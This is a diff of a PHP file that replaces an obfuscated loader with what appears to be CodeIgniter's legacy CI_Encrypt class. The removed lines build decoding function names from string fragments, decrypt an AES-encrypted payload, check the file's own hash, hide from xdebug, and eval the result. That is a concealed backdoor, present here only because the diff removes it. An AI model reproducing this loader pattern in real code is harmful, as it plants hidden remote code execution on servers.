@@ -1,28 +1,449 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_homiboc6=('bas'.'e64'.'_de'.'cod'.'e');
-$_ss6sylzi=('gzu'.'nco'.'mpr'.'ess');
-$_myiq37uv=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_h8k5g580='rmWs/krg';
-$_yixxwdoz='vGi7kxn5';
-$_gqar6mjx='B5Qhag2XsLE=';
-$_vxy1ilbr='lCorwJhf';
-$_fj1y5lr6='TS4HLjGK';
-$_m0iexhuz='MpM+0anN';
-$_uoa4mwbu='9nBaeXcJ';
-$_ku6a5mzt='pV3WOg==';
-$_olzkgoy3=$_homiboc6($_fj1y5lr6.$_vxy1ilbr.$_h8k5g580.$_yixxwdoz.$_gqar6mjx);
-$_xq2jwxoq=$_homiboc6($_m0iexhuz.$_uoa4mwbu.$_ku6a5mzt);
-$_z4tl2akl=$_homiboc6('2hfVrZ1HV3VF2xLWf0q3ElzcQN+MSQcswcYoIB1pAt+dRxvgqUgbric428Tt9Bzj/gNWkfg+JHZgdo1YcWeihfec4ERjmwzDrzhBZ3SoiZEkqquaNezk7/HCcJtSclRCQXRK7qEOuZDbx/gPDjYnzCE2Oi5e8ZpCVJKc8fusu/oMzCsWyrjY2FQ8oOS9baY9FJ9nD426vZIdC8B1Qj+FvqsjcUT1GEqG68u/8b5t4o/FZkUUgFRlb3lsUbKa6SgG3BkFIsPlDnl7CbjV8qPtTZzux5qgnUIhfgEmW97nQU3xOB21nc7GQRHJSm7IySHUNt98uDTXcIVMstzLrW8H2n9Zi1D3F1xv5QBW9MAEMQAS/RzfUnJFjQMeiLf5lLfl7Z9HgWiHOarzVXGk10rsOoeUBEsxtap+RZ98Oga22jDU2QxoJWUNakR7r6WVOuXlRsbDvH4f4KjTCsLb8xW5UD2iL+bsbyrtop5KTkGlXt3Bq/1QDaKFCgFSuX9rNZa9QlPz/qxtkN7JmXDWx3Jpitg1babDyRsNK4LOqqROFCBcdHnZ3YhfweQr4iKIZpq3hjQtrruywQvV3RsktvnhCT8aYxpyUKvS9f6nFAS9CDPG8d8/TAC7Tu5PBm0jNBM4uTAhHsm8FfgyfqshMHHvu3/wCx+g7lJyq2LRgyUW5DQqVch6r6qFAMkgWyvCpHbkjSjtmhLv7hdbpqXGmDTGXjlRWSGTQkP9rxcp7zyjsvQKuyewKIoPydX+KCVI0Z5kRy5p2LyDT/W67PQPxIAgmMlT5Koc3QuW9ipFgzypWPfLuT6II0+iRfdOf8BWryGZ6c2zXo6xgO6wBG2xXAbgmlX0RWtwHrgmdjVSbXjnp2sKc3NYHt1Bsi/dalAJA6VhCcT5ANcrR1NaEqXhZ8MTote0JIYN41L5SQ89jQq7ckcPX03uV1x1ujrBTtT6W1T7YCRuXx+KW+s2zcHcbbU6oEebBK5/vH59mwJskLiiTA4FwEptFEoxztGcb1lZOQfDiAdn3esKgBry50Z+BRKFdd8CdBbpqYOJE0z9Oy6FBbTJ0gUx6QN/Pp9edxHnjXlEaADGyrWlsWOmc9tXRky9HQqlSIJt2MXeA/pNprNyxh9QhVO1KoScU8qZjg01ds6jBYS/2vq5MP4SzY18V7PkxPf5qmBRh/+0xD2gfgN7c8a1xHitOc16tOBjzWRfvnWOXCRf1ewUqYq8GQoaYzOBnNVdj8A+fXLgg4CSVhjYMsOdykkxM/uVw/4Kyiw2F3mdezxnd1XY0J1mcyKew6KR8lS3e34FdGrQeHEyQWdbxcclwc08JRU00TjK/Vol2ZxS40R9gpMTj+IZA6XtRoA7vZJbdR2vhg7fzpf5OvegHXkzHeCkhNy1EuvRDtfpqSyAXjrTzfaCXL7Wam4FshMOC74lfMLcHugHinVmJXgDG/nNfYiOW/OAQOVJMBXt6wzLljH4zdShFERNzmM1FqvsenM/E1zVjGxCuoaNAsRq4fxPd9cMpc2jeyi+aFid+Y1MN8qkCuFlCoS9j5i2Mjsz09RAHxfd59a3Vr75ZhZMmPLGwCTwWGBDbYf3o505w55mjNH6QnZLu6wR9maT7AUt8ssCYL3uj22O44FmF9wkZsmbeymOSC5aG1hojBsw+seyVcewm5o4GLn/7gXCimybIoaNKB54V2oWsbpA1EwR7lXunliWKS+P87Iq0UJFqYCj2KV/V8d64eSM9fmCWLaMsC+3BpMOE8yfM2YmX7Lj2V3s4YIsRoD0Ed1yJ4Dvx5NXl0slRnzv2hfviQ4nkZLuBMmQVxwcHK++0silzu5b+0FfXjY8RS9PcCWSnN1SA7/i');
-$_lxv1jxyc=$_myiq37uv($_z4tl2akl,'aes-256-cbc',$_olzkgoy3,OPENSSL_RAW_DATA,$_xq2jwxoq);
-if($_lxv1jxyc===false){exit;}
-$_xmhju4ot=$_ss6sylzi($_lxv1jxyc);
-if($_xmhju4ot===false){exit;}
-$_pz4r3oc1='1fe6c9ba768ab9d5cce2107660a574bf2e2920b0c1248ccc593074829b9d9be9';
-$_vnpiby04=@file_get_contents(__FILE__);
-if($_vnpiby04!==false){
-$_t2h8xm4h=str_replace($_pz4r3oc1,"0000000000000000000000000000000000000000000000000000000000000000",$_vnpiby04);
-$_ex7dz7oo=hash("sha256",$_t2h8xm4h);
-if($_ex7dz7oo!==$_pz4r3oc1){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+class CI_Encrypt {
+
+
+
+
+
+public $encryption_key = '';
+
+
+
+
+
+protected $_hash_type = 'sha1';
+
+
+
+
+
+protected $_mcrypt_exists = FALSE;
+
+
+
+
+
+protected $_mcrypt_cipher;
+
+
+
+
+
+protected $_mcrypt_mode;
+
+
+
+
+
+public function __construct()
+{
+if (($this->_mcrypt_exists = function_exists('mcrypt_encrypt')) === FALSE)
+{
+show_error('The Encrypt library requires the Mcrypt extension.');
 }
-eval($_xmhju4ot);
+log_message('info', 'Encrypt Class Initialized');
+}
+
+
+
+
+
+
+
+
+
+
+public function get_key($key = '')
+{
+if ($key === '')
+{
+if ($this->encryption_key !== '')
+{
+return $this->encryption_key;
+}
+$key = config_item('encryption_key');
+if ( ! self::strlen($key))
+{
+show_error('In order to use the encryption class requires that you set an encryption key in your config file.');
+}
+}
+return md5($key);
+}
+
+
+
+
+
+
+
+public function set_key($key = '')
+{
+$this->encryption_key = $key;
+return $this;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function encode($string, $key = '')
+{
+return base64_encode($this->mcrypt_encode($string, $this->get_key($key)));
+}
+
+
+
+
+
+
+
+
+
+
+public function decode($string, $key = '')
+{
+if (preg_match('/[^a-zA-Z0-9\/\+=]/', $string) OR base64_encode(base64_decode($string)) !== $string)
+{
+return FALSE;
+}
+return $this->mcrypt_decode(base64_decode($string), $this->get_key($key));
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function encode_from_legacy($string, $legacy_mode = MCRYPT_MODE_ECB, $key = '')
+{
+if (preg_match('/[^a-zA-Z0-9\/\+=]/', $string))
+{
+return FALSE;
+}
+
+
+
+$current_mode = $this->_get_mode();
+$this->set_mode($legacy_mode);
+$key = $this->get_key($key);
+$dec = base64_decode($string);
+if (($dec = $this->mcrypt_decode($dec, $key)) === FALSE)
+{
+$this->set_mode($current_mode);
+return FALSE;
+}
+$dec = $this->_xor_decode($dec, $key);
+
+$this->set_mode($current_mode);
+
+return base64_encode($this->mcrypt_encode($dec, $key));
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _xor_decode($string, $key)
+{
+$string = $this->_xor_merge($string, $key);
+$dec = '';
+for ($i = 0, $l = self::strlen($string); $i < $l; $i++)
+{
+$dec .= ($string[$i++] ^ $string[$i]);
+}
+return $dec;
+}
+
+
+
+
+
+
+
+
+
+
+protected function _xor_merge($string, $key)
+{
+$hash = $this->hash($key);
+$str = '';
+for ($i = 0, $ls = self::strlen($string), $lh = self::strlen($hash); $i < $ls; $i++)
+{
+$str .= $string[$i] ^ $hash[($i % $lh)];
+}
+return $str;
+}
+
+
+
+
+
+
+
+
+public function mcrypt_encode($data, $key)
+{
+$init_size = mcrypt_get_iv_size($this->_get_cipher(), $this->_get_mode());
+$init_vect = mcrypt_create_iv($init_size, MCRYPT_DEV_URANDOM);
+return $this->_add_cipher_noise($init_vect.mcrypt_encrypt($this->_get_cipher(), $key, $data, $this->_get_mode(), $init_vect), $key);
+}
+
+
+
+
+
+
+
+
+public function mcrypt_decode($data, $key)
+{
+$data = $this->_remove_cipher_noise($data, $key);
+$init_size = mcrypt_get_iv_size($this->_get_cipher(), $this->_get_mode());
+if ($init_size > self::strlen($data))
+{
+return FALSE;
+}
+$init_vect = self::substr($data, 0, $init_size);
+$data = self::substr($data, $init_size);
+return rtrim(mcrypt_decrypt($this->_get_cipher(), $key, $data, $this->_get_mode(), $init_vect), "\0");
+}
+
+
+
+
+
+
+
+
+
+
+protected function _add_cipher_noise($data, $key)
+{
+$key = $this->hash($key);
+$str = '';
+for ($i = 0, $j = 0, $ld = self::strlen($data), $lk = self::strlen($key); $i < $ld; ++$i, ++$j)
+{
+if ($j >= $lk)
+{
+$j = 0;
+}
+$str .= chr((ord($data[$i]) + ord($key[$j])) % 256);
+}
+return $str;
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _remove_cipher_noise($data, $key)
+{
+$key = $this->hash($key);
+$str = '';
+for ($i = 0, $j = 0, $ld = self::strlen($data), $lk = self::strlen($key); $i < $ld; ++$i, ++$j)
+{
+if ($j >= $lk)
+{
+$j = 0;
+}
+$temp = ord($data[$i]) - ord($key[$j]);
+if ($temp < 0)
+{
+$temp += 256;
+}
+$str .= chr($temp);
+}
+return $str;
+}
+
+
+
+
+
+
+
+public function set_cipher($cipher)
+{
+$this->_mcrypt_cipher = $cipher;
+return $this;
+}
+
+
+
+
+
+
+
+public function set_mode($mode)
+{
+$this->_mcrypt_mode = $mode;
+return $this;
+}
+
+
+
+
+
+
+protected function _get_cipher()
+{
+if ($this->_mcrypt_cipher === NULL)
+{
+return $this->_mcrypt_cipher = MCRYPT_RIJNDAEL_256;
+}
+return $this->_mcrypt_cipher;
+}
+
+
+
+
+
+
+protected function _get_mode()
+{
+if ($this->_mcrypt_mode === NULL)
+{
+return $this->_mcrypt_mode = MCRYPT_MODE_CBC;
+}
+return $this->_mcrypt_mode;
+}
+
+
+
+
+
+
+
+public function set_hash($type = 'sha1')
+{
+$this->_hash_type = in_array($type, hash_algos()) ? $type : 'sha1';
+}
+
+
+
+
+
+
+
+public function hash($str)
+{
+return hash($this->_hash_type, $str);
+}
+
+
+
+
+
+
+
+protected static function strlen($str)
+{
+return defined('MB_OVERLOAD_STRING')
+? mb_strlen($str, '8bit')
+: strlen($str);
+}
+
+
+
+
+
+
+
+
+
+protected static function substr($str, $start, $length = NULL)
+{
+if (defined('MB_OVERLOAD_STRING'))
+{
+
+
+isset($length) OR $length = ($start >= 0 ? self::strlen($str) - $start : -$start);
+return mb_substr($str, $start, $length, '8bit');
+}
+return isset($length)
+? substr($str, $start, $length)
+: substr($str, $start);
+}
+}
